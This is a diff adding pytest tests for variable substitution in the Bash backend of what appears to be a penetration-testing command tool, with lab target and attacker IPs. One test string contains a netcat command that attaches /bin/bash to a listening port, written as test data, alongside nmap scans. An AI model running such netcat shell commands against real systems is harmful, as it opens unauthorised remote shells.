@@ -5,7 +5,7 @@ from pathlib import Path
 from unittest.mock import MagicMock, patch
 
 import pytest
-from wish_models import CommandState, LogFiles
+from wish_models import CommandState, LogFiles, Wish
 from wish_models.test_factories import WishDoingFactory
 
 from wish_command_execution.backend import BashBackend
@@ -187,3 +187,94 @@ class TestBashBackend:
 
         # Verify that the correct message was returned
         assert result == f"Command {cmd_num} is not running."
+
+    def test_replace_variables(self, backend):
+        """Test _replace_variables method.
+
+        This test verifies that the _replace_variables method correctly replaces
+        variables in commands.
+        """
+        # Create a mock wish with context
+        mock_wish = MagicMock(spec=Wish)
+        mock_wish.context = {
+            'target': {'rhost': '10.10.10.40'},
+            'attacker': {'lhost': '10.10.14.13'}
+        }
+
+        # Test basic variable replacement
+        command = "nmap -sV $TARGET_IP"
+        expected = "nmap -sV 10.10.10.40"
+        result = backend._replace_variables(command, mock_wish)
+        assert result == expected
+
+        # Test multiple variable replacement
+        command = "nmap -sV $TARGET_IP && nc -lvp 4444 -e /bin/bash $LHOST"
+        expected = "nmap -sV 10.10.10.40 && nc -lvp 4444 -e /bin/bash 10.10.14.13"
+        result = backend._replace_variables(command, mock_wish)
+        assert result == expected
+
+        # Test with no variables
+        command = "ls -la"
+        expected = "ls -la"
+        result = backend._replace_variables(command, mock_wish)
+        assert result == expected
+
+    def test_replace_variables_missing_values(self, backend):
+        """Test _replace_variables method with missing values.
+
+        This test verifies that the _replace_variables method correctly handles
+        the case where variable values are missing.
+        """
+        # Create a mock wish with empty context
+        mock_wish = MagicMock(spec=Wish)
+        mock_wish.context = {
+            'target': {},
+            'attacker': {}
+        }
+
+        # Test with missing variable values
+        command = "nmap -sV $TARGET_IP"
+        expected = "nmap -sV $TARGET_IP"  # Should remain unchanged
+        result = backend._replace_variables(command, mock_wish)
+        assert result == expected
+
+        # Test with no context
+        mock_wish.context = None
+        command = "nmap -sV $TARGET_IP"
+        expected = "nmap -sV $TARGET_IP"  # Should remain unchanged
+        result = backend._replace_variables(command, mock_wish)
+        assert result == expected
+
+    @pytest.mark.asyncio
+    @patch("subprocess.Popen")
+    @patch("builtins.open")
+    async def test_execute_command_with_variable_replacement(self, mock_open, mock_popen, backend, wish, log_files):
+        """Test execute_command method with variable replacement.
+
+        This test verifies that the execute_command method correctly replaces
+        variables in commands before execution.
+        """
+        # Set up the mock Popen
+        mock_process = MagicMock()
+        mock_popen.return_value = mock_process
+
+        # Set up mock file objects
+        mock_stdout = MagicMock()
+        mock_stderr = MagicMock()
+        mock_open.return_value.__enter__.side_effect = [mock_stdout, mock_stderr]
+
+        # Set up wish context
+        wish.context = {
+            'target': {'rhost': '10.10.10.40'},
+            'attacker': {'lhost': '10.10.14.13'}
+        }
+
+        # Execute a command with variables
+        cmd = "nmap -sV $TARGET_IP"
+        cmd_num = 1
+        await backend.execute_command(wish, cmd, cmd_num, log_files)
+
+        # Verify that Popen was called with the replaced command
+        mock_popen.assert_called_once()
+        args, kwargs = mock_popen.call_args
+        assert args[0] == "nmap -sV 10.10.10.40"
